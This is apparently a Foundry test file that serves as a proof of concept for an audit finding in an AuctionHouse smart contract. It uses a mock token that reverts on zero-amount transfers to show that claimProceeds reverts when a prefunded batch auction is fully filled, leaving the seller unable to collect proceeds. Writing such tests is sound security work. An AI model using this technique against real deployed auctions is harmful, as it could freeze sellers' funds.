// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {AuctionHouse, Router} from "src/AuctionHouse.sol";
import {Auction, AuctionModule} from "src/modules/Auction.sol";
import {FeeManager} from "src/bases/FeeManager.sol";
import {Auctioneer} from "src/bases/Auctioneer.sol";
import {Veecode, toKeycode, keycodeFromVeecode, Keycode} from "src/modules/Modules.sol";
import {Callbacks} from "src/lib/Callbacks.sol";
import {Transfer} from "src/lib/Transfer.sol";

import {MockBatchAuctionModule} from "test/modules/Auction/MockBatchAuctionModule.sol";
import {MockCallback} from "test/AuctionHouse/MockCallback.sol";
import {Permit2Clone} from "test/lib/permit2/Permit2Clone.sol";

/// @title MockRevertOnZeroTransferERC20
/// @notice Mock ERC20 token that reverts when attempting to transfer 0 amount
/// This simulates tokens that have validation logic preventing zero transfers
contract MockRevertOnZeroTransferERC20 is ERC20 {
    error ZeroTransferNotAllowed();

    constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_, decimals_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transfer(address to_, uint256 amount_) public override returns (bool) {
        if (amount_ == 0) revert ZeroTransferNotAllowed();
        return super.transfer(to_, amount_);
    }

    function transferFrom(address from_, address to_, uint256 amount_) public override returns (bool) {
        if (amount_ == 0) revert ZeroTransferNotAllowed();
        return super.transferFrom(from_, to_, amount_);
    }
}

contract ExploitTest is Test {
    MockRevertOnZeroTransferERC20 internal baseToken;
    MockRevertOnZeroTransferERC20 internal quoteToken;

    AuctionHouse internal auctionHouse;
    MockBatchAuctionModule internal batchAuctionModule;
    Keycode internal batchAuctionModuleKeycode;
    MockCallback internal callback;

    address internal constant SELLER = address(0x1);
    address internal constant PROTOCOL = address(0x2);
    address internal constant CURATOR = address(0x3);
    address internal constant BIDDER = address(0x4);
    address internal constant RECIPIENT = address(0x5);
    address internal constant REFERRER = address(0x6);

    uint96 internal constant LOT_CAPACITY = 10e18;
    uint48 internal constant START_TIME = 1_000_000;
    uint48 internal constant DURATION = 1 days;
    string internal constant INFO_HASH = "info hash";

    uint96 internal lotId;

    // Permit2 setup
    Permit2Clone internal _permit2 = new Permit2Clone();
    address internal _permit2Address = address(_permit2);

    function setUp() public {
        // Set block timestamp
        vm.warp(START_TIME);

        // Create tokens that revert on zero transfers
        baseToken = new MockRevertOnZeroTransferERC20("Base Token", "BASE", 18);
        quoteToken = new MockRevertOnZeroTransferERC20("Quote Token", "QUOTE", 18);

        // Deploy AuctionHouse
        auctionHouse = new AuctionHouse(address(this), PROTOCOL, _permit2Address);

        // Deploy and install batch auction module
        batchAuctionModule = new MockBatchAuctionModule(address(auctionHouse));
        batchAuctionModuleKeycode = keycodeFromVeecode(batchAuctionModule.VEECODE());
        auctionHouse.installModule(batchAuctionModule);

        // Set up callback with all permissions
        bytes32 salt = bytes32(0x667ba1181a4f5ab0c74a749f9628c6c2d5939ba3fbdbb81a8d62f1f44babce6a);
        vm.broadcast();
        callback = new MockCallback{salt: salt}(
            address(auctionHouse),
            Callbacks.Permissions({
                onCreate: true,
                onCancel: true,
                onCurate: true,
                onPurchase: true,
                onBid: true,
                onClaimProceeds: true,
                receiveQuoteTokens: false,
                sendBaseTokens: false
            }),
            SELLER
        );

        // Mint tokens to seller for prefunding
        baseToken.mint(SELLER, LOT_CAPACITY * 2);
        vm.prank(SELLER);
        baseToken.approve(address(auctionHouse), type(uint256).max);

        // Mint quote tokens to bidder
        quoteToken.mint(BIDDER, 100e18);
        vm.prank(BIDDER);
        quoteToken.approve(address(auctionHouse), type(uint256).max);
    }

    /// @notice Test that demonstrates the vulnerability in claimProceeds with revert-on-zero-transfer tokens
    /// @dev This test demonstrates the core vulnerability:
    /// 1. Create a batch auction that gets fully filled (no remaining base tokens)
    /// 2. Settle the auction
    /// 3. Attempt to claim proceeds - this will fail when trying to transfer 0 base tokens
    function testClaimProceedsFailsWithRevertOnZeroTransferToken() public {
        // Create a batch auction with exact capacity that will be fully filled
        Auctioneer.RoutingParams memory routingParams = Auctioneer.RoutingParams({
            auctionType: batchAuctionModuleKeycode,
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: CURATOR,
            callbacks: callback,
            callbackData: abi.encode(""),
            derivativeType: toKeycode(""),
            derivativeParams: abi.encode(""),
            wrapDerivative: false,
            prefunded: true
        });

        Auction.AuctionParams memory auctionParams = Auction.AuctionParams({
            start: START_TIME + 1,
            duration: DURATION,
            capacityInQuote: false,
            capacity: LOT_CAPACITY,
            implParams: abi.encode("")
        });

        // Create the auction
        vm.prank(SELLER);
        lotId = auctionHouse.auction(routingParams, auctionParams, INFO_HASH);

        // Start the auction
        vm.warp(START_TIME + 1);

        // Place a bid that exactly fills the capacity
        Router.BidParams memory bidParams = Router.BidParams({
            lotId: lotId,
            referrer: REFERRER,
            amount: 50e18, // This amount should fill the entire capacity
            auctionData: abi.encode(""),
            permit2Data: ""
        });

        vm.prank(BIDDER);
        uint64 bidId = auctionHouse.bid(bidParams, "");

        // Fast forward to the end of the auction
        vm.warp(START_TIME + DURATION + 1);

        // Settle the auction
        vm.prank(SELLER);
        auctionHouse.settle(lotId);

        // Claim the bid (this should work)
        uint64[] memory bidIds = new uint64[](1);
        bidIds[0] = bidId;
        vm.prank(BIDDER);
        auctionHouse.claimBids(lotId, bidIds);

        // Now attempt to claim proceeds - this should fail due to zero transfer revert
        // The vulnerability occurs because prefundingRefund = routing.funding + payoutSent_ - sold_
        // When the auction is fully filled, routing.funding becomes 0, and payoutSent_ equals sold_
        // This results in prefundingRefund = 0, which triggers a revert in our mock token
        vm.expectRevert(MockRevertOnZeroTransferERC20.ZeroTransferNotAllowed.selector);
        vm.prank(SELLER);
        auctionHouse.claimProceeds(lotId, "");
    }

    /// @notice Test that demonstrates the vulnerability exists specifically with revert-on-zero-transfer tokens
    /// @dev This test shows that the issue is not with normal auction flow but with zero transfer handling
    function testVulnerabilityDemonstration() public {
        // First, let's verify our mock token works correctly
        baseToken.mint(address(this), 100e18);

        // Normal transfer should work
        baseToken.transfer(address(0x999), 10e18);

        // Zero transfer should revert
        vm.expectRevert(MockRevertOnZeroTransferERC20.ZeroTransferNotAllowed.selector);
        baseToken.transfer(address(0x999), 0);

        // Now demonstrate the vulnerability scenario
        testClaimProceedsFailsWithRevertOnZeroTransferToken();
    }
}